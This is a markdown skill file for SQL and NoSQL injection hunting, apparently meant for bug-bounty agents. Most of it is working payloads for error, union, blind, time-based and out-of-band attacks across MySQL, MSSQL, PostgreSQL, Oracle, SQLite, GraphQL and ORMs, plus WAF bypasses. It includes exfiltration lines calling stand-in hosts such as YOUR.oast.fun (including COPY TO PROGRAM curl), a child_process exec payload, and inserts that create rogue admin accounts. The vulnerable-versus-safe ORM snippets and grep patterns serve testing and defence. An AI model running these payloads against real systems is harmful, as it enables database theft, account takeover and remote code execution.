---
name: hunt-sqli
description: "Modern SQL injection hunting (2025-2026). Use when target has any user-controlled input flowing to a database: search/filter/sort params, login/signup forms, GraphQL string args, ORDER BY/GROUP BY clauses, JSON request bodies, ORM raw queries (Prisma/Sequelize/TypeORM/Drizzle/Knex/SQLAlchemy/Django/ActiveRecord), API path segments, HTTP headers (User-Agent, Referer, Cookie, X-Forwarded-For), WebSocket frames, CSV/Excel import features. Covers MySQL/MariaDB/PostgreSQL/MSSQL/Oracle/SQLite/CockroachDB/Aurora dialects; error/union/boolean/time/OOB/second-order; JSON-SQL WAF bypass (Team82/Claroty); polyglot payloads; Python .pth → RCE (CVE-2025-25257 FortiWeb); psql meta-command RCE (CVE-2025-1094); Mongoose $where RCE (CVE-2024-53900 / CVE-2025-23061); GraphQL WebSocket SQLi; chain to RCE/ATO/cross-tenant data exfil. Only invoke if real impact (data dump with PII, auth bypass, RCE) is plausible — skip 'one quote = 500 error' findings without data extraction."
type: hunt
sources: hackerone, medium, payloadsallthethings, hacktricks, portswigger, claroty_team82, watchtowr_labs, rapid7, snyk
---

# Hunt: SQL Injection — Deep Research 2025-2026

## Why SQLi Still Pays Big in 2026

SQL injection has existed since 1998. It still powers major breaches in 2025-2026 because:
- Modern ORMs don't cover ORDER BY, GROUP BY, table/column names → devs concat strings
- GraphQL string args land in raw resolvers → injection through schema-validated fields
- Microservices use raw SQL for "performance" complex joins
- Headers (UA, Referer, Cookie, XFF) flow into analytics DB queries unsanitized
- JSON-wrapped SQL bypasses every major commercial WAF
- 14,000+ CVEs are SQL injection — OWASP Top 10:2025 A05 (Injection)

**Active KEV-listed exploitations in 2025-2026:**
- **CVE-2025-25257** (FortiWeb Fabric Connector) — pre-auth SQLi → INTO OUTFILE → Python `.pth` → unauth RCE as root. CVSS 9.6. Active mass exploitation July 2025.
- **CVE-2025-1094** (PostgreSQL libpq escape) — invalid UTF-8 bypasses `PQescapeLiteral`/`PQescapeIdentifier` → SQLi → psql meta-command RCE. Used in BeyondTrust → US Treasury breach.
- **CVE-2024-53900 / CVE-2025-23061** (Mongoose ORM `$where`) — NoSQLi via `populate()` → server-side JS → RCE on MongoDB.
- **CVE-2026-21643** (FortiClient EMS) — SQLi → privesc → RCE. Actively exploited since April 2026.
- **CVE-2025-1162** + 10 more (Ivanti Endpoint Manager) — auth SQLi suite for DB read.

**Recent HackerOne top payouts:**
- Valve `countryFilter[]` array SQLi → **$25,000**
- Mail.ru city-mobil time-based → **$15,000**
- Mail.ru fleet.city-mobil → **$10,000**
- Mail.ru news.mail.ru unauth → **$7,500**
- Mail.ru windows10.hi-tech cookie SQLi → **$5,000**
- Eternal/Zomato item_id → **$4,500**
- Grab drivegrab.com → **$4,500**
- inDrive id.indrive.com blind → **$4,134**
- Razer easy2pay → **$4,000**
- Razer (×4 different endpoints) → **$2,000** each
- InnoGames blind → **$2,000**

---

## Crown Jewel Targets

**Highest-EV asset types:**
- **SaaS with multi-tenant DBs** — one injection = all customer data
- **Fintech / payment / e-commerce** — PII + card + transaction records
- **Regional subdomains** (`.cn`, `.co.uk`, `.com.br`, `.in`) — local teams, lower maturity, often outside main WAF
- **WordPress / Joomla plugins on enterprise domains** — supply chain class (Uber Huge IT Video case)
- **Internal tooling externalized** — Airflow, Jenkins, GitHub Enterprise admin UIs
- **GraphQL endpoints** — schema validation ≠ resolver parameterization
- **Email tracking / analytics** infrastructure (sctrack.email.* pattern)
- **Mobile app backends** — devs assume mobile client = trusted
- **Legacy acquired companies** — old codebases still live on subdomains

**Endpoints that pay highest:**
- `/search`, `/filter`, `/sort`, `/report`, `/export`, `/api/v1/items`
- `/login`, `/auth`, `/password/reset` (data extraction → ATO chain)
- `/graphql` and `/graphql-ws` (mutation args, WebSocket subscriptions)
- `/admin/*` (post-auth = elevated DB privs = RCE potential)

---

## Modern Attack-Surface Signals

### URL patterns
```
?id=          ?uid=         ?user_id=
?q=           ?search=      ?query=
?cat=         ?category=    ?type=
?sort=        ?order=       ?orderby=    ?sort_by=
?filter=      ?where=       ?fields=
?limit=       ?offset=      ?page=       ?per_page=
?from=        ?to=          ?start=      ?end=
?txid=        ?orderid=     ?invoice=    ?ref=
?lang=        ?locale=      ?country=
?file=        ?doc=         ?report=
?status=      ?state=       ?stage=
?campaign=    ?promo=       ?coupon=
?period=      ?period-hour= ?date=       ?month=
```

### Header signals
- `X-Powered-By: PHP` — MySQL/MariaDB likely
- `X-Powered-By: ASP.NET` — MSSQL likely
- `Server: nginx` + `X-Powered-By: Express` — likely MongoDB/Postgres
- `Server: gunicorn` / `uvicorn` — Python (Postgres/SQLite likely)
- `X-Drupal-Cache`, `X-Generator: WordPress` — MySQL
- DB error strings leaking in 5xx responses

### JS bundle indicators
```bash
# Query construction in JS — string concat = SQLi candidate
grep -RE 'query\s*[+]=' src/
grep -RE 'WHERE.*[+]' src/
grep -RE 'ORDER BY.*[+]' src/
grep -RE '\.raw\(' src/                 # Knex/Sequelize raw
grep -RE '\.\$queryRawUnsafe\(' src/    # Prisma unsafe
grep -RE 'execute_string\|execute_raw' src/
grep -RE 'db\.execute\(' src/

# Endpoint discovery
grep -oE '/api/[a-zA-Z0-9_/-]+' dist/*.js | sort -u
```

### Tech stack → DB likelihood
| Stack signal | Likely DB |
|--------------|-----------|
| PHP / Laravel / WordPress / Drupal | MySQL / MariaDB |
| ASP.NET / IIS | MSSQL |
| Django / Flask + gunicorn | PostgreSQL / SQLite |
| Rails / Sinatra | PostgreSQL / MySQL |
| Spring Boot | PostgreSQL / MySQL / Oracle |
| .NET Core | MSSQL / PostgreSQL |
| Node/Express + Mongoose | MongoDB |
| Node/Express + Prisma | PostgreSQL / MySQL / SQLite |
| Node/Express + Sequelize/TypeORM | PostgreSQL / MySQL / MSSQL |
| Go + gorm/sqlx | PostgreSQL / MySQL |
| Strapi / Hasura | PostgreSQL |
| Supabase | PostgreSQL |
| Vercel + Drizzle | PostgreSQL / MySQL / SQLite |

---

## Step-by-Step Hunting Methodology

1. **Enumerate ALL input vectors.** Burp passive scan during normal use. Capture every parameter: GET/POST/path/JSON-body/cookies/headers (User-Agent, Referer, X-Forwarded-For, Accept-Language, Host, Authorization).
2. **Identify the DB.** Headers, errors, job postings, Wappalyzer, `?param='` and read error.
3. **Baseline.** Note normal status / length / time. This is the diff anchor.
4. **Error-based probes.** `'`, `"`, `` ` ``, `\`, `%27`, `%2527`, `'--`, `'#`, `'/*`, `')`, `'))`.
5. **Boolean blind.** `' AND 1=1--` vs `' AND 1=2--` (numeric: `1 AND 1=1` vs `1 AND 1=2`).
6. **Time blind.** Per-DB sleeps (MySQL `SLEEP(5)`, PG `pg_sleep(5)`, MSSQL `WAITFOR DELAY '0:0:5'`, Oracle `DBMS_PIPE.RECEIVE_MESSAGE`).
7. **OOB.** When the previous three fail — DNS callback via xp_dirtree / UTL_HTTP / LOAD_FILE UNC / COPY PROGRAM nslookup.
8. **NoSQLi.** JSON body `{"$gt":""}`, `{"$ne":""}`, `{"$where":"sleep(5000)"}`.
9. **WAF bypass.** JSON-SQL wrap (Team82), tamper combos, header injection, parameter pollution.
10. **Automate.** sqlmap / ghauri only AFTER manual confirmation. `--level=3 --risk=2 --batch`.
11. **Escalate to RCE.** INTO OUTFILE webshell, xp_cmdshell, COPY PROGRAM, Python .pth.
12. **Chain it.** Even data-read SQLi → ATO via password-reset-token forge, IDOR seeding, role table edit.

---

## SQLi TYPE DECISION TREE

```
Test ' ' " " ` `--
    │
    ├─ DB error in response → ERROR-BASED
    │       └─ extractvalue / updatexml / CONVERT / CAST extraction
    │
    ├─ No error, response BODY changes on AND 1=1 vs AND 1=2 → BOOLEAN BLIND
    │       └─ SUBSTR + ASCII binary-search extraction
    │
    ├─ No body change, response TIME changes on SLEEP(5) → TIME-BASED BLIND
    │       └─ conditional sleep extraction
    │
    ├─ No time change but DNS callback hit on xp_dirtree/UTL_HTTP → OOB
    │       └─ exfil entire row via DNS subdomain encoding
    │
    ├─ No first-order signal but data shows up later in another query → SECOND-ORDER
    │       └─ store '-- in username, trigger via second feature
    │
    └─ All blocked? → WAF BYPASS (JSON wrap → comments → encoding → headers → polyglot)
```

---

## TYPE 1: ERROR-BASED SQLi

### Initial probes (try ALL on every param)
```
'         ''        `         "         ""
\         %27       %22       %2527     %2522
'--       '#        '/*       ')        '))
'+'       '||'      ' OR '1'='1
admin'--  admin'#   admin' OR 1=1--
1 AND 1=1   1 AND 1=2     -1 OR 1=1
'=0--      '=1--           '||(SELECT 1)='
```

### MySQL — extractvalue / updatexml
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- -
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273),0x7e),1)-- -
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users LIMIT 1),0x7e),1)-- -

-- floor() + rand() (older but works on MySQL <5.7)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- JSON_VALUE / JSON_KEYS (MySQL 5.7+)
' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) USING utf8)))-- -
```

### MSSQL — CONVERT / CAST
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))-- -
' AND 1=CONVERT(int,@@version)-- -
' AND 1=CONVERT(int,(SELECT TOP 1 password_hash FROM sys.sql_logins WHERE name='sa'))-- -
' AND 1=CAST((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users') AS int)-- -

-- THROW (MSSQL 2012+)
'; THROW 50000,(SELECT TOP 1 password FROM users),1;-- -
```

### PostgreSQL — CAST / division-by-zero
```sql
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT current_database()) AS int)-- -
' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS int)-- -
' AND 1=CAST((SELECT passwd FROM pg_shadow LIMIT 1) AS int)-- -
' AND 1/(SELECT 1 WHERE (SELECT usename FROM pg_user LIMIT 1)='postgres')-- -

-- Postgres array bounds
' AND (SELECT '1' FROM generate_series(1,1) WHERE (SELECT usename FROM pg_user LIMIT 1)::int IS NULL)-- -
```

### Oracle — UTL_INADDR / XMLType
```sql
' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.oast.fun')-- -
' AND 1=XMLType((SELECT '<?xml version="1.0"?><x>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</x>' FROM dual))-- -
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -

-- ORA-01403 'no data found'
' AND (SELECT 1 FROM dual WHERE 1=1/(SELECT DECODE(SUBSTR(user,1,1),'S',0,1) FROM dual))-- -
```

### SQLite
```sql
' AND (SELECT CASE WHEN (SELECT sqlite_version())>'3' THEN abs(-9223372036854775808) END)-- -
' AND (SELECT LIKE('ABCD',UPPER(HEX(RANDOMBLOB(300000000/2)))))-- -
' AND (SELECT load_extension('/etc/passwd'))-- -
```

---

## TYPE 2: UNION-BASED SQLi

### Find column count
```sql
' ORDER BY 1-- -
' ORDER BY 5-- -          ← error → column count < 5
' ORDER BY 4-- -          ← OK → column count is 4

-- alt: UNION NULLs
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -    ← OK → 4 cols
```

### Find printable / int / string columns
```sql
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -
' UNION SELECT NULL,NULL,'a',NULL-- -
' UNION SELECT 1,NULL,NULL,NULL-- -      ← test for int cols

-- Postgres column-type strict
' UNION SELECT NULL::text,NULL::int,NULL::text,NULL::text-- -
```

### Extract data (per-DB)
```sql
-- MySQL
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL,NULL FROM information_schema.columns WHERE table_name=0x7573657273-- -
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL,NULL FROM users-- -

-- PostgreSQL
' UNION SELECT string_agg(table_name,','),NULL,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT string_agg(usename||':'||passwd,','),NULL,NULL,NULL FROM pg_shadow-- -

-- MSSQL
' UNION SELECT STRING_AGG(name,','),NULL,NULL,NULL FROM sys.tables-- -
' UNION SELECT STRING_AGG(name+':'+password_hash,','),NULL,NULL,NULL FROM sys.sql_logins-- -

-- Oracle
' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL,NULL,NULL FROM all_tables-- -

-- SQLite
' UNION SELECT GROUP_CONCAT(tbl_name),NULL,NULL,NULL FROM sqlite_master-- -
```

---

## TYPE 3: BOOLEAN-BASED BLIND

### Detection
```sql
' AND 1=1-- -    (true → normal)
' AND 1=2-- -    (false → different length/status/body)

-- ASCII-based binary search (faster than char-by-char)
' AND ASCII(SUBSTR(database(),1,1))>64-- -
' AND ASCII(SUBSTR(database(),1,1))>96-- -
' AND ASCII(SUBSTR(database(),1,1))>112-- -
' AND ASCII(SUBSTR(database(),1,1))=115-- -    ← 's'
```

### Per-DB SUBSTR variants
```sql
-- MySQL
SUBSTRING(s,n,m)   SUBSTR(s,n,m)   MID(s,n,m)   LEFT(s,n)   RIGHT(s,n)
-- PostgreSQL
SUBSTRING(s FROM n FOR m)   SUBSTR(s,n,m)
-- MSSQL
SUBSTRING(s,n,m)
-- Oracle
SUBSTR(s,n,m)
-- SQLite
SUBSTR(s,n,m)
```

### REGEXP/LIKE for pattern matching (works when SUBSTR blocked)
```sql
' AND (SELECT username FROM users WHERE username REGEXP '^a')-- -
' AND (SELECT username FROM users LIMIT 1) LIKE 'admin%'-- -
' AND (SELECT username FROM users LIMIT 1) LIKE 'a%' ESCAPE '\'-- -
```

---

## TYPE 4: TIME-BASED BLIND

### MySQL
```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTR(database(),1,1))=115,SLEEP(5),0)-- -

-- When SLEEP blocked
' AND BENCHMARK(50000000,MD5('a'))-- -
' AND IF(1=1,BENCHMARK(50000000,MD5('a')),0)-- -

-- Heavy join (no special function)
' AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)-- -

-- GET_LOCK technique
' AND GET_LOCK('a',5)-- -
```

### PostgreSQL
```sql
' AND (SELECT 1 FROM pg_sleep(5))-- -
'; SELECT pg_sleep(5)-- -
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
' AND CASE WHEN (SUBSTR((SELECT current_user),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- Heavy CTE recursion (when pg_sleep blocked)
' AND (WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT 1 FROM r LIMIT 99999999) SELECT 1 FROM r)-- -
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))=109) WAITFOR DELAY '0:0:5'-- -

-- Heavy join when WAITFOR blocked
'; SELECT COUNT(*) FROM sysobjects A, sysobjects B, sysobjects C-- -
```

### Oracle
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -

-- When DBMS_PIPE blocked
' AND (SELECT COUNT(*) FROM ALL_OBJECTS A, ALL_OBJECTS B, ALL_OBJECTS C)-- -

-- DBMS_LOCK (requires privs)
' BEGIN DBMS_LOCK.SLEEP(5); END;-- -
```

### Statistical confirmation (REQUIRED for triage acceptance)
```bash
# Baseline (5 trials)
for i in {1..5}; do
  curl -o /dev/null -s -w "%{time_total}\n" "https://t/q?id=1"
done

# Inject sleep-5 (5 trials)
for i in {1..5}; do
  curl -o /dev/null -s -w "%{time_total}\n" "https://t/q?id=1' AND SLEEP(5)-- -"
done

# Require: non-overlapping intervals
#   baseline max < 1s, inject min > 5s → confirmed
# A single 5-second outlier on a noisy network is NOT proof.
```

---

## TYPE 5: OUT-OF-BAND (OOB) SQLi

Pre-req: a Burp Collaborator / `oast.fun` / interact.sh domain. **You MUST register a unique subdomain per finding for non-repudiation.**

### MySQL OOB (Windows MySQL only — needs UNC support)
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.YOUR.oast.fun\\a'))-- -
' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',HEX((SELECT password FROM users LIMIT 1)),'.YOUR.oast.fun\\a'))-- -
```

### MSSQL OOB (most reliable)
```sql
'; EXEC master.dbo.xp_dirtree '\\YOUR.oast.fun\a'-- -
'; DECLARE @v varchar(1024);
SET @v=(SELECT TOP 1 password FROM users);
EXEC master.dbo.xp_dirtree '\\'+@v+'.YOUR.oast.fun\a'-- -

'; EXEC master.dbo.xp_fileexist '\\YOUR.oast.fun\a'-- -

'; EXEC master.dbo.xp_subdirs '\\YOUR.oast.fun\a'-- -

-- BCP / OPENROWSET (when xp_dirtree disabled)
'; SELECT * FROM OPENROWSET('SQLNCLI','Server=YOUR.oast.fun;UID=a;PWD=a','SELECT 1')-- -
```

### PostgreSQL OOB
```sql
-- Superuser required
'; COPY (SELECT '') TO PROGRAM 'nslookup YOUR.oast.fun'-- -
'; COPY (SELECT '') TO PROGRAM 'curl http://YOUR.oast.fun/$(id|base64)'-- -

-- dblink (if installed)
'; SELECT dblink_connect('host='||(SELECT version())||'.YOUR.oast.fun user=a password=a')-- -

-- LO_IMPORT (read local file too)
'; SELECT lo_import('/etc/passwd', 12345)-- -
```

### Oracle OOB
```sql
' AND UTL_HTTP.request('http://YOUR.oast.fun/'||(SELECT user FROM dual))=''-- -
' AND UTL_INADDR.get_host_address((SELECT user FROM dual)||'.YOUR.oast.fun')=''-- -
' AND DBMS_LDAP.INIT((SELECT user FROM dual)||'.YOUR.oast.fun',80)>0-- -
' AND HTTPURITYPE((SELECT user FROM dual)||'.YOUR.oast.fun').GETCLOB() IS NOT NULL-- -

-- XML-based
' AND UTL_INADDR.get_host_name((SELECT password FROM dba_users WHERE rownum=1)||'.YOUR.oast.fun')=''-- -
```

---

## TYPE 6: SECOND-ORDER SQLi

Storage and execution are decoupled. Insert through one feature, trigger via another.

### Pattern
```
Stage 1 (safe):  Registration form parameterizes correctly
                 → INSERT INTO users(name) VALUES (?)
                 → name = "admin'--" stored as literal

Stage 2 (unsafe): Profile update concatenates the stored name
                 → "UPDATE prefs WHERE owner='" + name + "'"
                 → becomes  WHERE owner='admin'--'
                 → comment kills the rest → updates admin's prefs
```

### Where to hunt
- Username/email used in subsequent queries (search, lookup, password reset)
- Import features (CSV/XML/Excel — sanitization only on direct API)
- Profile fields rendered into report SQL
- Stored search filters / saved queries
- Order references reused in fulfillment SQL
- Cached values pulled from `localStorage`/`sessionStorage` → server consumes them later
- Webhook payloads stored, then re-processed by scheduled job

### Test
```
Stage 1 — register with payloads:
admin'-- -
admin'/*
test\
ZZZZZZ' AND SLEEP(5)-- -
ZZZZZZ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -

Stage 2 — trigger every feature that uses the stored value:
- Login
- View profile
- Edit profile
- Search by username
- Password reset by email
- Order lookup
- Admin "view user" panels
```

If any returns delayed response / error / different behavior → second-order confirmed.

### Real impact patterns
- Insert `'); INSERT INTO admin_users VALUES('hacker','hash'); --` into a field that flows into raw SQL → silent admin account creation
- Insert `'); UPDATE users SET email='attacker@evil.com' WHERE id=1; --` → email-of-admin change → reset → ATO

---

## TYPE 7: SQL IN GRAPHQL (incl. WebSocket subscriptions)

### Standard mutation/query
```graphql
query { user(name: "test'") { id } }
query { user(name: "test' AND SLEEP(5)-- -") { id } }
query { user(name: "test' AND 1=1-- -") { id email role } }
query { user(name: "patt';SELECT pg_sleep(30);--") { id } }

mutation {
  createUser(input: { name: "test' OR 1=1-- -", email: "x@x.com" }) { id }
}

# UUID args (HackerOne $0 report — embedded_submission_form_uuid)
query {
  submission(embedded_submission_form_uuid: "00000000-0000-0000-0000-000000000000' UNION SELECT password FROM users-- -") { id }
}
```

### GraphQL alias batching to spam injection attempts
```graphql
query {
  a01: user(name: "x' OR 1=1-- -") { id }
  a02: user(name: "x' OR 1=2-- -") { id }
  a03: user(name: "x' UNION SELECT 1-- -") { id }
  ...
}
```

### GraphQL WebSocket SQLi (April 2026, Ahmed Ghadban writeup)
WebSocket `graphql-ws` subscriptions often skip rate-limit + WAF checks.
```
ws://target.com/graphql-ws
> {"type":"subscribe","id":"1","payload":{"query":"subscription { docUpdate(id:\"1' UNION SELECT email,password FROM users-- -\") { content } }"}}
```
Real bounty: PII + document leak via PostgreSQL error-based SQLi over WebSocket.

### GraphQL "Burp scanner misses these" patterns
- Inject in **variable values** (not just inline strings)
- Inject in **directives**: `@include(if: "x' OR 1=1-- -")` (Apollo-specific)
- Inject in **fragment names** if dynamically built
- Inject in **operation names** (logged to DB)

---

## TYPE 8: ORM-Specific Injection (2025-2026 modern)

ORMs are NOT immune. They use raw SQL escape hatches that are often vulnerable.

### Prisma (Node.js)
```javascript
// SAFE (parameterized tagged template)
prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`

// VULNERABLE — Unsafe escape hatch
prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${userId}`)
prisma.$executeRawUnsafe(`UPDATE users SET role='${userRole}'`)

// VULNERABLE — Prisma operator injection (Aikido 2025 research)
// If req.body.email is { startsWith: "" }, this becomes a wildcard match
prisma.user.findFirst({ where: { email: req.body.email, password: req.body.password } })
// Defeats "NoSQL-style" auth even on Postgres!
```
**Test:** POST `{"email":{"startsWith":""},"password":{"startsWith":""}}` to login endpoints using Prisma. Confirmed RCE-tier auth bypass class in 2025-2026.

### Sequelize
```javascript
// VULNERABLE
sequelize.query("SELECT * FROM users WHERE name = '" + name + "'")

// PARTIALLY VULNERABLE — CVE-2019-10752 (replacements bypass)
sequelize.query("SELECT * FROM users WHERE name = :name", { replacements: { name } })
// Pre-patch versions: arrays in :name parameter bypassed escape

// Sequelize.literal — always vulnerable
User.findAll({ where: Sequelize.literal("name='" + name + "'") })
```

### TypeORM
```typescript
// VULNERABLE
repo.query("SELECT * FROM users WHERE name = '" + name + "'")
repo.createQueryBuilder().where("name = '" + name + "'")  // String concat in where()

// SAFE
repo.createQueryBuilder().where("name = :name", { name })
```

### Knex.js (and Bookshelf, Objection)
```javascript
// VULNERABLE
knex.raw("SELECT * FROM users WHERE id = " + id)

// SAFE
knex.raw("SELECT * FROM users WHERE id = ?", [id])

// VULNERABLE — orderBy with user input
knex('users').orderBy(req.query.sort)   // sort = "name; DROP TABLE users-- -"
```

### Drizzle ORM (2026 trend)
```typescript
// VULNERABLE — sql.raw
db.execute(sql.raw(`SELECT * FROM users WHERE id = ${userId}`))

// SAFE — tagged template
db.execute(sql`SELECT * FROM users WHERE id = ${userId}`)
```

### ActiveRecord (Rails)
```ruby
# VULNERABLE
User.where("name = '#{params[:name]}'")
User.where("id IN (#{params[:ids]})")
User.order(params[:sort])              # sortable param injection (#1 Rails SQLi)
User.find_by_sql("SELECT * FROM users WHERE name='#{name}'")
User.exists?(["name = '#{name}'"])     # array form with interpolation

# SAFE
User.where(name: params[:name])
User.where("name = ?", params[:name])
User.order(safe_sort_column)
```

### Django ORM
```python
# VULNERABLE
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
User.objects.extra(where=[f"name = '{name}'"])

# SAFE
User.objects.raw("SELECT * FROM users WHERE name = %s", [name])
cursor.execute("SELECT * FROM users WHERE id = %s", [user_id])
```

### SQLAlchemy
```python
# VULNERABLE
db.execute(f"SELECT * FROM users WHERE name = '{name}'")
db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# SAFE
db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})

# VULNERABLE — order_by with user input
session.query(User).order_by(text(req.args['sort']))
```

### How to hunt ORMs in source code
```bash
# Prisma unsafe
grep -RE '\$queryRawUnsafe|\$executeRawUnsafe' src/

# Sequelize / TypeORM raw
grep -RE 'sequelize\.query|connection\.query|repo\.query' src/
grep -RE 'Sequelize\.literal|QueryBuilder.*where\(.*[+]' src/

# Knex
grep -RE 'knex\.raw|knex\.\w+\.raw' src/

# Drizzle
grep -RE 'sql\.raw' src/

# Rails
grep -REn 'where\(["\047].*#{|order\(params|find_by_sql\(["\047].*#{' app/

# Django
grep -REn '\.raw\(f["\047]|cursor\.execute\(f["\047]|\.extra\(' .

# SQLAlchemy
grep -REn 'text\(f["\047]|\.execute\(f["\047]' .
```

---

## TYPE 9: NoSQL Injection (MongoDB / Mongoose) — chained when stack is hybrid

### Operator injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": null}}
```

### $where JavaScript injection (MongoDB)
```json
{"$where": "this.username == this.password"}
{"$where": "sleep(5000)"}
{"$where": "function(){var s = ''; for(var i=0;i<5000;i++) s+='a'; return true}"}
```

### CVE-2024-53900 / CVE-2025-23061 — Mongoose `populate()` $where bypass
```javascript
// Vulnerable: populate's match accepts $where
Article.find().populate({
  path: 'author',
  match: req.body.filter   // attacker sends {"$where": "global.process.mainModule.require('child_process').exec('id > /tmp/o')"}
})

// Bypass for first patch (CVE-2025-23061): wrap in $or
{"$or": [{"$where": "...RCE..."}]}
```

### URL/query string variant (PHP-style)
```
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=^admin&password[$regex]=.*
username[$gt]=&password[$gt]=
```

---

## TYPE 10: SQLi in HTTP Headers (under-hunted in 2026)

WAFs often only inspect query params + body. Headers are gold.

### Vectors
```http
User-Agent: Mozilla/5.0' AND SLEEP(5)-- -
Referer: https://google.com/search?q=test' OR 1=1-- -
X-Forwarded-For: 127.0.0.1' AND SLEEP(5)-- -
X-Real-IP: 127.0.0.1' AND SLEEP(5)-- -
True-Client-IP: 127.0.0.1' AND SLEEP(5)-- -
Accept-Language: en-US,en' AND SLEEP(5)-- -;q=0.9
Cookie: session=abc; user_id=1' AND SLEEP(5)-- -
Authorization: Bearer AAA' OR 1=1-- -      ← FortiWeb CVE-2025-25257 pattern!
Host: target.com' AND SLEEP(5)-- -
X-Api-Version: v1' AND SLEEP(5)-- -
Origin: https://target.com' AND SLEEP(5)-- -
```

### sqlmap header injection
```bash
sqlmap -u "https://t/api" --headers="User-Agent: *" --level=3 --risk=2 --batch
sqlmap -u "https://t/api" --cookie="session=*" --level=2 --batch
# * marks injection point
```

### Real cases
- **GSA Bounty H1 #297478** — User-Agent SQLi at labs.data.gov
- **MTN H1 #761304** — Cookie value flowed into query
- **FortiWeb CVE-2025-25257** — Authorization Bearer header → pre-auth RCE
- **HackerOne #1018621** — Referer SQLi

---

## TYPE 11: SQLi in ORDER BY / GROUP BY / LIMIT (ORM bypass class)

These clauses cannot use placeholders → developer escapes manually → often wrong.

### ORDER BY
```sql
-- Boolean via CASE
?sort=(CASE WHEN (1=1) THEN id ELSE name END)
?sort=(CASE WHEN ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=65 THEN id ELSE name END)

-- Subquery
?sort=(SELECT IF(1=1,1,(SELECT 1 UNION SELECT 2)))
?sort=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)

-- Time-based
?sort=(SELECT IF(1=1,SLEEP(5),0))
?sort=1,(SELECT IF(1=1,SLEEP(5),0))     ← multi-column ORDER BY
?sort=name,(SELECT 1 FROM pg_sleep(5))  ← PostgreSQL
```

### GROUP BY
```sql
?groupby=(CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
?groupby=1,(SELECT IF(1=1,SLEEP(5),0))
```

### LIMIT / OFFSET
```sql
?limit=10 PROCEDURE ANALYSE(EXTRACTVALUE(2,CONCAT(0x3a,(SELECT version()))),1)   -- MySQL <5.6
?offset=0; SELECT pg_sleep(5)-- -                                                 -- PG stacked
?limit=10 UNION SELECT 1,2,3                                                       -- if no order by
```

### Column-name SQLi (rare, juicy)
```sql
?columns=id,name,password,(SELECT password FROM users WHERE role='admin') AS x
```

---

## MODERN WAF BYPASS — 2025-2026 Techniques

### 1. JSON-based SQL injection (Team82 / Claroty)
The vendor list officially bypassed: **AWS WAF, Cloudflare, F5 BIG-IP, Imperva, Palo Alto Networks**.

#### Core trick
Wrap the SQLi in JSON-extraction syntax — WAFs don't parse JSON as SQL → DB executes it.

#### MySQL
```sql
'-(SELECT IF((SELECT JSON_LENGTH('{}'))=0,SLEEP(5),0))-- -
' OR JSON_LENGTH('{"a":1}')<=2 UNION SELECT @@version-- -
' OR JSON_EXTRACT('{"id":1}','$.id')=1 UNION SELECT password FROM users-- -
```

#### PostgreSQL
```sql
'-(SELECT CASE WHEN ('{}'::jsonb @> '{}') THEN pg_sleep(5) END)-- -
' OR ('{"a":1}'::jsonb)->>'a' = '1' UNION SELECT current_database()-- -
